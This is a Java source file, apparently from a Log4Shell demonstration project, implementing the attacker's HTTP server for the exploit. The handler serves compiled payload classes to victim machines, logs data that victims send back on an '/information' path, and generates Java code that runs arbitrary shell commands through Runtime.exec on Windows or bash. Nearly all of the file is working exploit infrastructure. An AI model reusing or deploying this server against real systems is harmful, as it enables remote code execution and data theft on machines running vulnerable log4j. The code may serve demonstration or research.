package com.demo.exploit.log4jshell.attacker.server.http;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.*;
import java.util.Objects;

/**
 * This class will handle all the HTTP requests.
 * It will send the attackers payload to Victims computer
 *
 * @author karanratra on 12/20/21
 */
public class AttackerHttpFileHandler implements HttpHandler {
    public AttackerHttpFileHandler() {
    }
    public static byte[] byteCode = null;


    private  static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static String getInsertCode(String command){
        String source = "";

        String cmd = "";

        if (command.startsWith("code:")) {
            String codefile = command.substring(5);
            try
            {
                File file = new File(codefile);
                if (file.exists())
                {
                    FileReader reader = new FileReader(file);
                    BufferedReader br = new BufferedReader(reader);
                    StringBuffer sb = new StringBuffer("");
                    String line = "";
                    while ((line = br.readLine()) != null)
                    {
                        sb.append(line);
                        sb.append("\r\n");
                    }
                    cmd = sb.toString();
                }
                else
                {
                    System.err.println(String.format("[-] %s is not exists!", new Object[] { codefile }));
                    System.exit(0);
                }
                //System.err.println("----------------------------------Java code start----------------------------------");
                //System.err.println(cmd);
                //System.err.println("-----------------------------------Java code end-----------------------------------");
                source = cmd;
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        else if(command.startsWith("cmd:")){
            cmd = command.substring(4).replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
            String tpl = "try {\n" +
                    "            String cmd = \"" + cmd + "\";\n" +
                    "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                    "                    ? new String[]{\"cmd\", \"/c\", cmd}\n" +
                    "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                    "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n" +
                    "            pc.waitFor();\n" +
                    "        }catch (Exception e){\n" +
                    "            e.printStackTrace();\n" +
                    "        }";

            source = tpl;
        }

        return source;
    }


//    public void handleOld(HttpExchange httpExchange) {
//        try {
//            System.out.println("[+] [HTTP Server log] new http request from " + httpExchange.getRemoteAddress() + " - GET " + httpExchange.getRequestURI());
//            String uri = httpExchange.getRequestURI().getPath();
//            InputStream inputStream = null;
//            if(uri.indexOf("Exploit.class")>0){
//                inputStream = new ByteArrayInputStream(serialize(new Exploit()));
//            }else {
//                inputStream = AttackerHttpFileHandler.class.getResourceAsStream(uri);
//            }
//            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//
//            if (inputStream == null){
//                System.out.println("Not Found");
//                httpExchange.close();
//                return;
//            }else{
//                while(inputStream.available() > 0) {
//                    byteArrayOutputStream.write(inputStream.read());
//                }
//
//                byte[] bytes = byteArrayOutputStream.toByteArray();
//                String s = new String(bytes);
//                System.out.println(s);
//                httpExchange.sendResponseHeaders(200, (long)bytes.length);
//                httpExchange.getResponseBody().write(bytes);
//                httpExchange.close();
//            }
//        } catch (Exception var5) {
//            var5.printStackTrace();
//        }
//    }


    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String payloadPath = "/com/demo/exploit/log4jshell/";
        //log request
        System.out.println();
        System.out.println();
        System.out.println("Request: " + exchange.getRequestURI() + " " + exchange.getRequestMethod());
        System.out.println("Address: " + exchange.getRemoteAddress());
        System.out.println("User-Agent: " + exchange.getRequestHeaders().getFirst("User-Agent"));
        byte[] response = "Hello World".getBytes();

        if (exchange.getRequestURI().getPath().startsWith(payloadPath)) {
            System.out.println("PAYLOAD!!!!!!!!!!");
            //response = Main.getPayload(exchange.getRequestURI().getPath());
            response = getPayload(exchange.getRequestURI().getPath());
        }
        if (exchange.getRequestURI().getPath().startsWith("/information")) {
            System.out.println("INFORMATION!!!!!!!!!!");
            System.out.println();
            String parsed = exchange.getRequestURI().getPath().substring("/information".length());
            parsed = parsed.replace("/", " ");
            //remove .class at the end
            if (parsed.endsWith(".class")) parsed = parsed.substring(0, parsed.length() - 6);
            System.out.println("Parsed: " + parsed);
            System.out.println();
        }

        exchange.sendResponseHeaders(200, response.length);
        exchange.getResponseBody().write(response);
        exchange.close();
    }

    public static byte[] getPayload(String payload) {
        String address = "localhost";
        int port = 80;
        String defaultPayload = "com.demo.exploit.log4jshell.Exploit";

        payload = payload.endsWith(".class") ? payload.substring(0, payload.length() - 6) : payload;
        payload = payload.replace('.', '/');
        payload = payload.endsWith(".class") ? payload : payload + ".class";
        payload = payload.startsWith("/") ? payload : '/' + payload;
        try {
            byte [] byteArray = new byte[5000];
            //return Objects.requireNonNull(Main.class.getResourceAsStream(payload)).readAllBytes();
            Objects.requireNonNull(AttackerHttpFileHandler.class.getResourceAsStream(payload)).read(byteArray);
            //My Implementation
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            InputStream in = AttackerHttpFileHandler.class.getResourceAsStream(payload);
            byte[] buffer = new byte[4096];
            for (;;) {
                int nread = in.read(buffer);
                if (nread <= 0) {
                    break;
                }
                baos.write(buffer, 0, nread);
            }
            byte[] data = baos.toByteArray();
            return data;
            //return byteArray;
        } catch (Exception e) {
            if (payload.equals(defaultPayload)) {
                throw new RuntimeException("Could not find default payload: " + payload);//really
            }
            System.err.println("Could not find payload: '" + payload + "', Trying to use default: " + defaultPayload);
            return getPayload(defaultPayload);
        }
    }
}